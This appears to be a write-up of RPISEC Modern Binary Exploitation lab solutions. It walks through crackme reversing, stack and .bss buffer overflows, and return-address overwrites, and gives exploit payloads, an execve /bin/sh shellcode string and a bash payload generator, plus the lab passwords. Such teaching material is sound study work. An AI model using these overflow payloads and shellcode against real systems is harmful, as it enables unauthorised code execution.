# Writeups for MBE

## Lab 1C

### Recon

```
$ ./lab1C
-----------------------------
--- RPISEC - CrackMe v1.0 ---
-----------------------------

Password:
```

It's a crackme, so lets grab out some info about imports from external libraries to get a clue what functionality it provides by using syscalls i.e.:

```
$ rabin2 -ii lab1C
[Imports]
ordinal=001 plt=0xffffffff bind=UNKNOWN type=NOTYPE name=_ITM_deregisterTMCloneTable
ordinal=002 plt=0x08048550 bind=GLOBAL type=FUNC name=printf
ordinal=003 plt=0x08048560 bind=GLOBAL type=FUNC name=puts
ordinal=004 plt=0x08048570 bind=GLOBAL type=FUNC name=system
ordinal=005 plt=0x08048580 bind=UNKNOWN type=NOTYPE name=__gmon_start__
ordinal=006 plt=0x08048590 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=007 plt=0xffffffff bind=UNKNOWN type=NOTYPE name=_Jv_RegisterClasses
ordinal=008 plt=0x080485a0 bind=GLOBAL type=FUNC name=__isoc99_scanf
ordinal=009 plt=0xffffffff bind=UNKNOWN type=NOTYPE name=_ITM_registerTMCloneTable
```

Nothing super-spectacular, besides the use of ```system``` provided by libc. It's just a first guess, but I think the shot could be to provide lucky password, step onto the right path on "badboy" routine and spawning shell after all.

```
rafind2 -X -s "Password" ./lab1C
0x80d
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0000080d  5061 7373 776f 7264 3a20 0025 6400 0a41  Password: .%d..A
0x0000081d  7574 6865 6e74 6963 6174 6564 2100 2f62  uthenticated!./b
0x0000082d  696e 2f73 6800 0a49 6e76 616c 6964 2050  in/sh..Invalid P
0x0000083d  6173 7377 6f72 6421 2121 0001 1b03 3b28  assword!!!....;(
0x0000084d  0000 0004 0000 00f8 fcff ff44 0000       ...........D..
0x83c
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x0000083c, 5061 7373 776f 7264 2121 2100 011b 033b  Password!!!....;
0x0000084c, 2800 0000 0400 0000 f8fc ffff 4400 0000  (...........D...
0x0000085c, 65fe ffff 6800 0000 f8fe ffff 8800 0000  e...h...........
0x0000086c, 68ff ffff c400 0000 1400 0000 0000 0000  h...............
0x0000087c, 017a 5200 017c 0801 1b0c 0404 8801       .zR..|........
```

By the way, the string "Password:" and the other shots above are all hard-wired in elf-binaries .rodata section. You can easily check that by using:

```
$ readelf -S ./lab1C
[...]
[15] .rodata           PROGBITS        080487c8 0007c8 000080 00   A  0   0  4
[...]
```

Let's use some radare cmds to find the location where we are faced with "Password:" prompt:

```
[0x080485b0]> iz~Password
vaddr=0x0804880c paddr=0x0000080c ordinal=002 sz=12 len=11 section=.rodata type=a string=\nPassword:
vaddr=0x08048833 paddr=0x00000833 ordinal=005 sz=21 len=20 section=.rodata type=a string=\nInvalid Password!!!
[0x080485b0]> axt @ 0x0804880c
d 0x80486da mov dword [esp], str._nPassword:
[0x080485b0]> pd 1@ 0x0804880c
   ; DATA XREF from 0x080486da (sym.main)
   ;-- str._nPassword::
   0x0804880c     .string "\\nPassword: " ; len=12
```

So in ```main``` there's the prompt. So let's seek to that:

```

│          0x080486ea    89442404       mov dword [esp + 4], eax        ; [0x4:4]=0x10101 
│          0x080486ee    c70424188804.  mov dword [esp], 0x8048818      ; [0x8048818:4]=0xa006425  ; "%d" @ 0x8048818
│          0x080486f5    e8a6feffff     call sym.imp.__isoc99_scanf    ;[3] ;sym.imp.__isoc99_scanf()
```

So at 0x080486f5 there's a call to ```scanf()``` which stores our input in a locally stored variable at esp+0x1C. What's the format specifier at 0x8048818?

```
:> ps @ 0x8048818
%d
``` 

It treats our input as integer, which is then compared to another int at 0x080486fe:

```
0x080486fe    3d9a140000     cmp eax, 0x149a 
```

Our input just has to be 0x149a and we will be faced with a shell afterwars. Fort lazy people lik me there's a radare built-in functionality to compare numbers:

```
:> ? 0x149a
5274 0x149a 012232 5.2K 0000:049a 5274 10011010 5274.0 0.000000f 0.000000
```

You could also use the tool ```rax2``` provided by radare framework to complete that task:

```
:> !!rax2 0x149a
5274
```

[![asciicast](https://asciinema.org/a/xIvKfysNoDOXShVBcp9mVCncU.png)](https://asciinema.org/a/xIvKfysNoDOXShVBcp9mVCncU)

### Pass Lab1B
```
n0_str1ngs_n0_pr0bl3m
```

## Lab1B

### Recon

```
$ ./lab1B
.---------------------------.
|-- RPISEC - CrackMe v2.0 --|
'---------------------------'

Password:
```

This time We have to enter an integer too.
It'll be stored at esp+0x4 by calling ```scanf```. Afterwars there's a call to ```test()```, which gets provided by two arguments on the stack:

- Our input integer and
- A hard wired integer with 0x1337d00d as value

In  ```test``` these values get copied to eax and edx registers. Both values (0x1337d00d and our input) will be subtracted from each other. There's a check afterwards if some condition is met:

```
 ;-- sym.test:                                                                                                                                                                                   
0x08048a74	  push ebp    
0x08048a75	  mov ebp, esp
0x08048a77	  sub esp, 0x28
0x08048a7a	  mov eax, dword [ebp + 8]       ; [0x8:4]=0
0x08048a7d	  mov edx, dword [ebp + 0xc]     ; [0xc:4]=0
0x08048a80	  sub edx, eax
0x08048a82	  mov eax, edx
0x08048a84	  mov dword [ebp-local_3], eax
0x08048a87	  cmp dword [ebp-local_3], 0x15  ; [0x15:4]=0x50000000 
0x08048a8b	  ja 0x8048bd5                  ;[1]
```

So difference of the two operands has to be less equal 0x15, otherwise we'll be rdeirected to functions epilogue and not to ```decrypt``` routine where we want to step into.

If we look closely at the imported functions list, we struggle over a call to ```system()``` with ```decrypt``` as caller. Strategy seems to be to here to input a number passing the check in main and afterwards the one in decryption routine.

Our input will then be xored with a special bytearray loaded by instructions between 0x080489c8 and 0x080489dd

```
0x080489c8    c745e3517d7c.  mov dword [ebp-local_7_1], 0x757c7d51  ; [0x757c7d51:4]=-1   
0x080489cf    c745e7607366.  mov dword [ebp - 0x19], 0x67667360  ; [0x67667360:4]=-1      
0x080489d6    c745eb7e7366.  mov dword [ebp - 0x15], 0x7b66737e  ; [0x7b66737e:4]=-1      
0x080489dd    c745ef7d7c61.  mov dword [ebp - 0x11], 0x33617c7d  ; [0x33617c7d:4]=-1      
```

After that result will be compared against string "Congratulations_".

```
0x08048a28    8b45d8         mov eax, dword [ebp-local_10]                                
0x08048a2b    3b45dc         cmp eax, dword [ebp-local_9]                                 
0x08048a2e    72d8           jb 0x8048a08                  ;[4]
0x08048a30    c7442404038d.  mov dword [esp + 4], str.Congratulations_  ; [0x8048d03:4]=0x676e6f43  ; "Congratulations!" @ 0x8048d03
│           0x08048a38    8d45e3         lea eax, [ebp-local_7_1]                                                                                                                                           
0x08048a3b    890424         mov dword [esp], eax                                         
0x08048a3e    e82dfdffff     call sym.imp.strcmp            ; sub.strcmp_12_76c+0x4 ;[5] ;sub.strcmp_12_76c() ; sym.imp.strcmp
```

I set a breakpoint at 0x080489e8 and printed out the bytearray located on the stack:

```
:> p8 17 @ ebp-0x19
517d7c75607366677e73667b7d7c613300
:> ps @ ebp-0x1d
Q}|u`sfg~sf{}|a3
```

input - 0x1337d00d <= 0x15
input <= 322424866

So summarized there are now the following two conditions:



- diff = Input - 0x1337d00d <= 0x15
- diff ^ b"bQ}|u`sfg~sf{}|a3" = b"Congratulations_"

To solve these equations I used one of my favourite toolset: z3. The script is provided in "lab1B.py"
[![asciicast](https://asciinema.org/a/Z4sFerJotqJG03pw48Vq86gqd.png)](https://asciinema.org/a/Z4sFerJotqJG03pw48Vq86gqd)

### Pass Lab1Bwq
```
1337_3nCRyptI0n_br0
```

## Lab1A

### Recon

After entering some arbitrary username, the program extpects us to input a serial:

```
$ ./lab1A
.---------------------------.
|---------  RPISEC  --------|
|+ SECURE LOGIN SYS v. 3.0 +|
|---------------------------|
|~- Enter your Username:  ~-|
'---------------------------'
???
.---------------------------.
| !! NEW ACCOUNT DETECTED !!|
|---------------------------|
|~- Input your serial:    ~-|
'---------------------------'
```

Let's check the conditions on the serial we have to met.
At 0x08048c12 there's a call to ```scanf()```, which treats out input as unsigned int:

```
:> ps @ 0x8048d00
%u
```

After entering input ```auth``` gets called which will write all input bytes up to newline char to a pointer pointing to ebp+8:

```
0x08048a15	  mov dword [esp + 4], 0x8048d03  ; [0x8048d03:4]=10 
0x08048a1d	  mov eax, dword [ebp + 8]        ; [0x8:4]=0                
0x08048a20	  mov dword [esp], eax                               
0x08048a23	  call sym.imp.strcspn  
```

After wards length of our input is checked via ```strlen()``` with maclen of 32 bytes:

```
0x08048a30	  mov dword [esp + 4], 0x20       ; [0x20:4]=0x2168  ; "h!" 0x00000020
0x08048a38	  mov eax, dword [ebp + 8]        ; [0x8:4]=0
0x08048a3b	  mov dword [esp], eax
0x08048a3e	  call sym.imp.strnlen 
```

In main we observe, that auth has to return 0, and we'll be faced with shell.

input += 3
(input_LSB ^ 0x1337) + 0x5eeded <= 0

### Pass Lab1A
```
1uCKy_Gue55
```

## Lab2C

### Recon

If we look closely into sourcecode, we observe, that there's an obvoius stack-based buffer-overflow bug in the way argv[1] gets handled. Aim is to overwrite local var ```set_me``` with hex value ```0xdeadbeef```, so that function ```shell()``` gets called. The only thing we just don't know yet is the offset we have to use to overwrite local var ```set_me```.

Here's the interesting disassembly part
```
0x08048712	  call sym.imp.strcpy
0x08048718	  cmp dword [esp + 0x2c], 0xdeadbeef
0x08048720	  jne 0x8048729
0x08048722	  call sym.shell
```

So we set a breakpoint before ```strcpy``` gets called and determine the offset between ```esp+0x2c``` (set_me) and our buffer in argv[1].

```
gdb-peda$ b *0x08048718
gdb-peda$ r AAAA
[...]
gdb-peda$ searchmem "AAAA"
Searching for 'AAAA' in: None ranges
Found 2 results, display max 2 items:
[stack] : 0xbffff69d ("AAAA")
[stack] : 0xbffff89e ("AAAA")
```

So we have out buffer twice on stack. The one at higher address is the one originally located in main's argv. The lower one is the one that has been copied into main's stack frame after ```strcpy``` operation.

```
gdb-peda$ p/x ($esp+0x2c) - 0xbffff69d
$1 = 0xf
```

We need an offset of 15 bytes to overwrite local var ```set_me```.

```
$ ./lab2C $(printf "A%.0s" {1..15})$(printf "\xef\xbe\xad\xde")
You did it.
$
```

### Pass Lab2C

```
1m_all_ab0ut_d4t_b33f
```

## Lab2B

### Recon

```C
int main(int argc, char** argv)
{
        if(argc != 2)
        {
                printf("usage:\n%s string\n", argv[0]);
                return EXIT_FAILURE;
        }

        print_name(argv[1]);

        return EXIT_SUCCESS;
}
```
Once agaain, there's an obvious overflow bug in argv[1]'s handling by ```main``` function. But this time ```shell()``` won't be called directly. This time we have to manipulate program's control flow, to get print_name's retuen value to be redirected to shell. It's an RIP overwrite.

```
gdb-peda$ pattern_arg 200
[...]
gdb-peda$ pattern_offsett $eip
994132292 found at offset: 27
```

We would have to determine ```shell()```'s address in .text section by using radare i.e.:

```
r2 -A ./lab2B
 -- Find hexpairs with '/x a0 cc 33'
[0x080485c0]> afl~shell
0x080486bd  19  1  sym.shell
[0x080486bd]> !!rax2 -N 0x080486bd
\xbd\x86\x04\x08
```

We write the identified pattern into temporary file:

```
$ echo $(python -c 'print "A"*27+"\xbd\x86\x04\x08"') > /tmp/pattern.txt
$ gdb --quiet -q ./lab2B
$ gdb-peda$ gdb-peda$ r $(cat /tmp/pattern.txt)
Starting program: /levels/lab02/lab2B $(cat /tmp/pattern.txt)
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAA
[New process 1160]
process 1160 is executing new program: /bin/dash
```

But new process exited with ```EXIT_FAILURE```... So something is missing.
It's the argument for ```shell()``` function. Luckily the string "/bin/sh" is hard wired in binary's text section:

```
$ r2 -A ./lab2B
 -- r2 is meant to be read by machines.
[0x080485c0]> fs strings; f
0x080487d0 8 str._bin_sh
0x080487d8 10 str.Hello__s_n
0x080487e2 18 str.usage:_n_s_string_n
[0x080485c0]> !!rax2 -N 0x080487d0
\xd0\x87\x04\x08
```

We also have to set some some return value after opening shell, but it's value doesn't really matter. After grabbing our flag forked process will die...Who cares?

```
$ echo $(python -c 'print "A"*27+"\xbd\x86\x04\x08" + "JUNK" + "\xd0\x87\x04\x08"') > /tmp/pattern.txt
$ ./lab2B $(cat /tmp/pattern.txt)
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAJUNKЇ
$

```

### Pass Lab2A

```
i_c4ll_wh4t_i_w4nt_n00b
```

## Lab2A

### Recon

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * compiled with:
 * gcc -O0 -fno-stack-protector lab2A.c -o lab2A
 */

void shell()
{
        printf("You got it\n");
        system("/bin/sh");
}

void concatenate_first_chars()
{
        struct {
                char word_buf[12];
                int i;
                char* cat_pointer;
                char cat_buf[10];
        } locals;
        locals.cat_pointer = locals.cat_buf;

        printf("Input 10 words:\n");
        for(locals.i=0; locals.i!=10; locals.i++)
        {
// Read from stdin
                if(fgets(locals.word_buf, 0x10, stdin) == 0 || locals.word_buf[0] == '\n')
                {
                        printf("Failed to read word\n");
                        return;
                }
                // Copy first char from word to next location in concatenated buffer
                *locals.cat_pointer = *locals.word_buf;
                locals.cat_pointer++;
        }

        // Even if something goes wrong, there's a null byte here
        //   preventing buffer overflows
        locals.cat_buf[10] = '\0';
        printf("Here are the first characters from the 10 words concatenated:\n\
%s\n", locals.cat_buf);
}

int main(int argc, char** argv)
{
        if(argc != 1)
        {
                printf("usage:\n%s\n", argv[0]);
                return EXIT_FAILURE;
        }

        concatenate_first_chars();

        printf("Not authenticated\n");
        return EXIT_SUCCESS;
}
```

s we can see, the main function calls a function that calls a function that creates a struct, reads 10 words in, aand prints out first letter of each word.
irst thing to note is, that index variable i is vuln to bein' overflowed, and because loop merely checks i does not equal ten, it can be overflown as we want. This will give us the chance to read in as many bytes as we want, leading to further overflows.

he buffer ```word_buf``` in struct ```locals``` just has capacity for 12 characters and due to alignment on stack, the counter ```i``` should be located at offset 12 in struct. So if we input more than 12 bytes in ```concatenate_first_chars()``` when ```fgets()``` gets called, we should be able to overwrite ```i```. This is the stack just after prologue in ```concatenate_first_chars()``` has been called:

```
gdb-peda$ x/32xw $esp
0xbffff660:     0xffffffff      0xbffff68e      0xb7e2fbf8      0xb7e56273
0xbffff670:     0x00000000      0x00c30000      0x00000001      0x0804856d
0xbffff680:     0xbffff88f      0x0000002f      0x0804a000      0x08048852
0xbffff690:     0x00000001      0xbffff754      0xbffff6b8      0x080487e6
0xbffff6a0:     0xb7fcd3c4      0xb7fff000      0x0804880b      0xb7fcd000
0xbffff6b0:     0x08048800      0x00000000      0x00000000      0xb7e3ca83
0xbffff6c0:     0x00000001      0xbffff754      0xbffff75c      0xb7feccea
0xbffff6d0:     0x00000001      0xbffff754      0xbffff6f4      0x0804a020
```
And here's the stack layout after a word (here just consisting of one A and a trailing newline) has been entered:

```
gdb-peda$ x/32xw $esp
0xbffff660:     0xbffff670      0x00000010      0xb7fcdc20      0xb7e56273
0xbffff670:     0x00000a41      0x00c30000      0x00000001      0x00000000    <= 0xbffff670 is loc of input buffer
0xbffff680:     0xbffff684      0x0000002f      0x0804a000      0x08048852
0xbffff690:     0x00000001      0xbffff754      0xbffff6b8      0x080487e6
0xbffff6a0:     0xb7fcd3c4      0xb7fff000      0x0804880b      0xb7fcd000
0xbffff6b0:     0x08048800      0x00000000      0x00000000      0xb7e3ca83
0xbffff6c0:     0x00000001      0xbffff754      0xbffff75c      0xb7feccea
0xbffff6d0:     0x00000001      0xbffff754      0xbffff6f4      0x0804a020
```

We have inputted 12 A's and value at 0xbffff67c is is value of '\n' after it has been incremented (i++):

```
gdb-peda$ x/32xw $esp
0xbffff660:     0xbffff670      0x00000010      0xb7fcdc20      0xb7e56273
0xbffff670:     0x41414141      0x41414141      0x41414141      0x0000000b
0xbffff680:     0xbffff685      0x00000041      0x0804a000      0x08048852
0xbffff690:     0x00000001      0xbffff754      0xbffff6b8      0x080487e6
0xbffff6a0:     0xb7fcd3c4      0xb7fff000      0x0804880b      0xb7fcd000
0xbffff6b0:     0x08048800      0x00000000      0x00000000      0xb7e3ca83
0xbffff6c0:     0x00000001      0xbffff754      0xbffff75c      0xb7feccea
0xbffff6d0:     0x00000001      0xbffff754      0xbffff6f4      0x0804a020
```
So our payload consists of 12 A's + "\n", where 13th byte overwrites i.
At 0xbffff680 there's the location where each character is stored. It must be overflown to overwrite return address of function, which is at 0xbffff69c:

```
gdb-peda$ i frame 0
Stack frame at 0xbffff6a0:
 eip = 0x8048795 in concatenate_first_chars; saved eip = 0x80487e6
 called by frame at 0xbffff6c0
 Arglist at 0xbffff698, args:
 Locals at 0xbffff698, Previous frame's sp is 0xbffff6a0
 Saved registers:
  ebp at 0xbffff698, eip at 0xbffff69c
```
So after writing 24 more bytes (including the first overflow byte) we should be able to overwrite RIP.

```
$ python -c 'print "A"*12+"\n"+"B\n"*23+"\xef\n"+"\xbe\n"+"\xad\n"+"\xde\n"' > /tmp/pattern2.txt
[...]
gdb-peda$ r < <(cat /tmp/pattern2.txt) 
Stopped reason: SIGSEGV
0xdeadbeef in ?? ()
```

Now we have to find the address of ```shell()``` function we want to return to:

```
gdb-peda$ p shell
$1 = {<text variable, no debug info>} 0x80486fd <shell>
[...]
$ python -c 'print "A"*12+"\n"+"B\n"*23+"\xfd\n"+"\x86\n"+"\x04\n"+"\x08\n"' > /tmp/pattern2.txt
$ (cat /tmp/pattern2.txt; cat -) | ./lab2A
Input 10 words:
Failed to read word
You got it
ls
lab2A  lab2A.c  lab2B  lab2B.c  lab2C  lab2C.c
```

The ```cat - ``` command is for leaving stdin open.

### Pass Lab2end

```
D1d_y0u_enj0y_y0ur_cats?
```

## lab 3C
### Recon

Labs in level 3 are focussed on shellcoding and this time we have access to source code files of challs.

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* gcc -z execstack -fno-stack-protector -o lab3C lab3C.c */

char a_user_name[100];

int verify_user_name()
{
    puts("verifying username....\n");
    return strncmp(a_user_name, "rpisec", 6);
}

int verify_user_pass(char *a_user_pass)
{
    return strncmp(a_user_pass, "admin", 5);
}

int main()
{
    char a_user_pass[64] = {0};
    int x = 0;

    /* prompt for the username - read 100 byes */
    printf("********* ADMIN LOGIN PROMPT *********\n");
    printf("Enter Username: ");
    fgets(a_user_name, 0x100, stdin);

    /* verify input username */
    x = verify_user_name()
    if (x != 0){
        puts("nope, incorrect username...\n");
        return EXIT_FAILURE;
    }

    /* prompt for admin password - read 64 bytes */
    printf("Enter Password: \n");
    fgets(a_user_pass, 0x64, stdin);

    /* verify input password */
    x = verify_user_pass(a_user_pass);
    if (x == 0 || x != 0){
        puts("nope, incorrect password...\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
```
We have a 100 bytes buffer in binary's .bss section and three functions:

1. First verfifies username and checks if first six bytes of input are equal to "ripsec".
2. Second verifies password with a comparison to "admin".
3. Third is main function
        * Input supplied by user is copied to a 0x100 (256) bytes buffer via ```fgets()```
        * Here is also the major security hole. ```fgets(x, 0x100, stdin)``` does not read 100 bytes, it does read 256 bytes on the address provided by x. This allows for a overflow in .bss section

Here we have our strategy:
* Provocate an overflow while reading username, while providing first six bytes to be "rpisec" 
* Since binary doesn't have NX-bit enabled we also can place some shellcode in buffer, prepending a large enough nop slide.
```
$ checksec lab3C
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY FORTIFIED FORTIFY-able  FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No      0               4       lab3C
```
* Since ```fgets()``` will get triggered twice, after providing 256 bytes of username, there will be 100 bytes (enough space!!!) left for shellcode.

An interesting aspect is, that "EXIT_FAILURE"-path in ```main()``` will never be triggered if some bytes not equal to zero have been written to ```x```.

So our payload will look like:

```bash
#!/bin/bash

username=`printf "rpisec"`
pattern=`printf "%.sA" {1..249}`
payload=`printf "%.sB" {1..100}`

echo $username$pattern$payload
```



### Pass Lab3C
```
th3r3_iz_n0_4dm1ns_0n1y_U!
```
Let's look at our buffer after second call to ```fgets()``` has been executed:

```
gdb-peda$ b *0x08048838
Breakpoint 1 at 0x8048838
gdb-peda$ r < /tmp/payload
[...]
gdb-peda$ p &a_user_name
$2 = (<data variable, no debug info> *) 0x8049c40 <a_user_name>
gdb-peda$ x/256xw 0x8049c40
0x8049c40 <a_user_name>:        0x73697072      0x41416365      0x41414141      0x41414141
0x8049c50 <a_user_name+16>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049c60 <a_user_name+32>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049c70 <a_user_name+48>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049c80 <a_user_name+64>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049c90 <a_user_name+80>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049ca0 <a_user_name+96>:     0x41414141      0x41414141      0x41414141      0x41414141
0x8049cb0:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049cc0:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049cd0:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049ce0:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049cf0:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049d00:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049d10:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049d20:      0x41414141      0x41414141      0x41414141      0x41414141
0x8049d30:      0x41414141      0x41414141      0x41414141      0x00414141
```
 We have fully overwritten the variable and first six bytes are equal to "rpisec":

 ```
gdb-peda$ x/6c (void *)0x8049c40
0x8049c40 <a_user_name>:        0x72    0x70    0x69    0x73    0x65    0x63
gdb-peda$ x/s (void *)0x8049c40
0x8049c40 <a_user_name>:        "rpisec", 'A' <repeats 194 times>...
```
If we continue execution, we should observe a segfault:

```
gdb-peda$ c
[...]
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$
```

Nice, we control EIP, so what's the correct offset to overwrite Return Instruction Ptr?

```
gdb-peda$ r < /tmp/payload
[...]
gdb-peda$ bt
#0  0x08048838 in main ()
#1  0x42424242 in ?? ()
#2  0x42424242 in ?? ()
#3  0x42424242 in ?? ()
#4  0x42424242 in ?? ()
#5  0x00424242 in ?? ()
#6  0x00000001 in ?? ()
#7  0xbffff754 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
gdb-peda$ i frame 0
Stack frame at 0xbffff6c0:
 eip = 0x8048838 in main; saved eip = 0x42424242
 called by frame at 0xbffff6c4
 Arglist at 0xbffff6b8, args:
 Locals at 0xbffff6b8, Previous frame's sp is 0xbffff6c0
 Saved registers:
  ebx at 0xbffff6b0, ebp at 0xbffff6b8, edi at 0xbffff6b4, eip at 0xbffff6bc
gdb-peda$ x/32xw $esp
0xbffff650:     0xbffff66c      0x00000064      0xb7fcdc20      0xb7eb8216
0xbffff660:     0xffffffff      0xbffff68e      0xb7e2fbf8      0x42424242
0xbffff670:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff680:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff690:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff6a0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff6b0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff6c0:     0x42424242      0x42424242      0x42424242      0x00424242
gdb-peda$ distance 0xbffff66c 0xbffff6bc
From 0xbffff66c to 0xbffff6bc: 80 bytes, 20 dwords
gdb-peda$
```

So offset to RIP is at offset 80 bytes in buffer filled with B's or 20 dwords apart from start of the same. There's a handy feature in radare for accomplsishing that task:
```
$ r2 --
 -- The door is everything..
[0x00000000]> e asm.bits=32 
[0x00000000]> gi exec
[0x00000000]> g
31c050682f2f7368682f62696e89e3505389e199b00bcd80
[0x00000000]> q
lab3C@warzone:/levels/lab03$ echo -n "31c050682f2f7368682f62696e89e3505389e199b00bcd80" | wc -c
48
lab3C@warzone:/levels/lab03$ echo "31c050682f2f7368682f62696e89e3505389e199b00bcd80" | sed -e 's/\(..\)/\\x\1/g'
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```
So payload will now look like:

```
$ cat /tmp/lab3C.sh
#!/bin/bash

username=`printf "rpisec"`
nopsled=`printf "%.s\x90" {1..12}`
pattern=`printf "%.sA" {1..213}`
payload=`printf "%.sB" {1..80}`
shellcode=`printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`
echo $username$nopsled$shellcode$pattern$payload
lab3C@warzone:/levels/lab03$ /tmp/lab3C.sh > /tmp/payload                                             
lab3C@warzone:/levels/lab03$ hexdump -C /tmp/payload
00000000  72 70 69 73 65 63 90 90  90 90 90 90 90 90 90 90  |rpisec..........|
00000010  90 90 31 c0 50 68 2f 2f  73 68 68 2f 62 69 6e 89  |..1.Ph//shh/bin.|
00000020  e3 50 53 89 e1 99 b0 0b  cd 80 41 41 41 41 41 41  |.PS.......AAAAAA|
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
000000f0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 42  |AAAAAAAAAAAAAAAB|
00000100  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 42  |BBBBBBBBBBBBBBBB|
*
00000140  42 42 42 42 42 42 42 42  42 42 42 42 42 42 42 0a  |BBBBBBBBBBBBBBB.|
```

Disassembly near first call to ```fgets()``` reveals, that our buffer (username) will be stored at 0x8049c40 (.data section):

```
 0x80487e0 <main+80>: mov    DWORD PTR [esp],0x8049c40
=> 0x80487e7 <main+87>: call   0x80485f0 <fgets@plt>
gdb-peda$ vmmap 0x8049c40
Start      End        Perm      Name
0x08049000 0x0804a000 rwxp      /levels/lab03/lab3C
```

We will use this information to specify the value RIP gets overwritten with. Actually our payload will be generated like this:

```bash
#!/bin/bash

username=`printf "rpisec"`
nopsled=`printf "%.s\x90" {1..12}`
pattern=`printf "%.sA" {1..213}`
payload=`printf "%.sB" {1..80}`
shellcode=`printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"`
rip=`printf "\x48\x9c\x04\x08"`
echo $username$nopsled$shellcode$pattern$payload$rip
```

Finally we need to execute our exploit as such:

```
$ (cat /tmp/payload; cat) | ./lab3C
cat /home/lab3B/.pass
th3r3_iz_n0_4dm1ns_0n1y_U!
```

### Pass Lab3B
```
th3r3_iz_n0_4dm1ns_0n1y_U!
```
## Lab 3B
### Recon

```C
#include <signal.h>
#include <assert.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/prctl.h>
#include <wait.h>
#include "utils.h"

ENABLE_TIMEOUT(60)

/* gcc -z execstack -fno-stack-protector -o lab3B lab3B.c */

/* hint: write shellcode that opens and reads the .pass file.
   ptrace() is meant to deter you from using /bin/sh shellcode */

int main()
{
    pid_t child = fork();
    char buffer[128] = {0};
    int syscall = 0;
    int status = 0;

    if(child == 0)
    {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);

        /* this is all you need to worry about */
        puts("just give me some shellcode, k");
        gets(buffer);
    }
    else
    {
        /* mini exec() sandbox, you can ignore this */
        while(1)
        {
            wait(&status);
            if (WIFEXITED(status) || WIFSIGNALED(status)){
                puts("child is exiting...");
                break;
            }

            /* grab the syscall # */
            syscall = ptrace(PTRACE_PEEKUSER, child, 4 * ORIG_EAX, NULL);

            /* filter out syscall 11, exec */
            if(syscall == 11)
            {
                printf("no exec() for you\n");
                kill(child, SIGKILL);
                break;
            }
        }
    }

    return EXIT_SUCCESS;
}
```
